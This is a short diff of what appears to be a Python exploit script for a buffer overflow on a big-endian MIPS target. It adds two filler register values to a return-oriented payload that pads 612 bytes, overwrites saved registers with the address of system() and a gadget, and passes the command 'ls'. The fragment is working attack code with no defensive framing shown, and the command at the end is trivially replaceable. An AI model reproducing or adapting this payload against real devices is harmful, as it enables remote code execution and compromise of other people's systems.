@@ -39,6 +39,8 @@ libc =0x7671B000
 
 s0=struct.pack(">I",0x76774BB0)#system
 s1=struct.pack(">I",0x41414141)#useless
+s2=struct.pack(">I",0x43434343)#useless
+s3=struct.pack(">I",0x44444444)#useless
 ra=struct.pack(">I",0x7673156C)#godget1
 
 x="A"*612+s0+s1+s2+s3+ra+"a"*16+"ls"
